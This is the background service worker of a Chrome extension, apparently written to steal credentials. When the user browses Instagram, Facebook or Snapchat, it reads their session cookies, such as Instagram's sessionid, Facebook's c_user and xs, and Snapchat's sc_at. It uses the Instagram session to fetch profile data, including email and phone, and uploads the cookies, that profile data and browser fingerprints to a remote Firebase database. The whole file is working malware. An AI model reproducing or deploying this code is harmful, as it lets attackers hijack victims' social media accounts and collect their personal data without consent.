console.log("🚀 Service Worker Loaded ✅");

import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
import { isDuplicateData } from "./utils.js";

// 📥 Listen for fingerprint messages
chrome.runtime.onMessage.addListener(async (message) => {
  if (message.type === "fingerprint") {
    const data = message.data;
    console.log("📥 Received fingerprint from content script:", data);

    const colRef = collection(db, "Fingerprints");
    const isDuplicate = await isDuplicateData(colRef, data);

    if (isDuplicate) {
      console.log("🛑 Duplicate fingerprint data found — Not saved.");
      return;
    }

    await addDoc(colRef, { ...data, timestamp: new Date() });
    console.log("✅ New fingerprint saved to Firebase.");
  }
});

// 🌐 Cookie Handling
chrome.webNavigation.onCompleted.addListener(
  async (details) => {
    const url = details.url;

    if (url.includes("instagram.com")) {
      await handleInstagram();
    } else if (url.includes("facebook.com")) {
      await handleFacebook();
    } else if (url.includes("snapchat.com")) {
      await handleSnapchat();
    }
  },
  {
    url: [
      { hostSuffix: "instagram.com" },
      { hostSuffix: "facebook.com" },
      { hostSuffix: "snapchat.com" },
    ],
  }
);

// ℹ️ Instagram
async function handleInstagram() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.warn("⚠️ Instagram cookies missing.");
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    console.log("🔹 IG Session ID:", sessionId);
    console.log("🔹 IG User ID:", userId);

    const userInfo = await fetchIGUserInfo(sessionId, userId);

    const docData = {
      platform: "Instagram",
      sessionId,
      userId,
      domain: "instagram.com",
    };

    // ✅ Only check duplicate with sessionId + userId + platform + domain
    const colRef = collection(db, "instagram");
    const isDuplicate = await isDuplicateData(colRef, docData);

    if (isDuplicate) {
      console.log("🛑 Duplicate Instagram data found — Not saved.");
      return;
    }

    // ✅ Add extra userInfo after checking
    await addDoc(colRef, { ...docData, ...userInfo, timestamp: new Date() });
    console.log("✅ New Instagram data saved:", userInfo.username);
  });
}

async function fetchIGUserInfo(sessionId, userId) {
  const url = `https://i.instagram.com/api/v1/users/${userId}/info/`;

  try {
    const response = await fetch(url, {
      method: "GET",
      headers: {
        "User-Agent": "Instagram 219.0.0.12.117 Android",
        Cookie: `sessionid=${sessionId};`,
        "X-IG-App-ID": "936619743392459",
        "Accept-Language": "en-US",
      },
    });

    if (!response.ok) {
      console.warn("⚠️ IG API failed:", response.status);
      return { username: "unknown_user" };
    }

    const user = (await response.json()).user;

    return {
      username: user?.username || "unknown_user",
      full_name: user?.full_name || "N/A",
      bio: user?.biography || "N/A",
      website: user?.external_url || "N/A",
      profile_pic: user?.profile_pic_url || "",
      profile_pic_hd: user?.hd_profile_pic_url_info?.url || "",
      is_verified: user?.is_verified || false,
      is_private: user?.is_private || false,
      followers: user?.follower_count ?? 0,
      following: user?.following_count ?? 0,
      posts: user?.media_count ?? 0,
      category: user?.category || "N/A",
      public_email: user?.public_email || "Not Available",
      public_phone: user?.public_phone_number || "Not Available",
    };
  } catch (error) {
    console.error("❌ IG fetch error:", error);
    return { username: "unknown_user" };
  }
}

// 📘 Facebook
async function handleFacebook() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      console.warn("⚠️ Facebook cookies missing.");
      return;
    }

    const docData = {
      platform: "Facebook",
      c_user: cUser.value,
      xs: xs.value,
      domain: "facebook.com",
    };

    const colRef = collection(db, "facebook");
    const isDuplicate = await isDuplicateData(colRef, docData);

    if (isDuplicate) {
      console.log("🛑 Duplicate Facebook data found — Not saved.");
      return;
    }

    await addDoc(colRef, { ...docData, timestamp: new Date() });
    console.log("✅ New Facebook data saved:", cUser.value);
  });
}

// 👻 Snapchat
async function handleSnapchat() {
  chrome.cookies.getAll({ domain: ".snapchat.com" }, async (cookies) => {
    const sc_at = cookies.find((c) => c.name === "sc_at");
    const sc_sid = cookies.find((c) => c.name === "_sc-sid");
    const blizzard_web_session_id = cookies.find(
      (c) => c.name === "blizzard_web_session_id"
    );
    const sc_nonce = cookies.find((c) => c.name === "sc-a-nonce");
    const sc_wcid = cookies.find((c) => c.name === "sc-wcid");

    if (
      !sc_at ||
      !sc_sid ||
      !blizzard_web_session_id ||
      !sc_nonce ||
      !sc_wcid
    ) {
      console.warn("⚠️ One or more Snapchat cookies missing.");
      return;
    }

    const docData = {
      platform: "Snapchat",
      sc_at: sc_at.value,
      _sc_sid: sc_sid.value,
      blizzard_web_session_id: blizzard_web_session_id.value,
      sc_a_nonce: sc_nonce.value,
      sc_wcid: sc_wcid.value,
      domain: "snapchat.com",
    };

    const colRef = collection(db, "snapchat");
    const isDuplicate = await isDuplicateData(colRef, docData);

    if (isDuplicate) {
      console.log("🛑 Duplicate Snapchat data found — Not saved.");
      return;
    }

    await addDoc(colRef, { ...docData, timestamp: new Date() });
    console.log("✅ New Snapchat data saved.");
  });
}
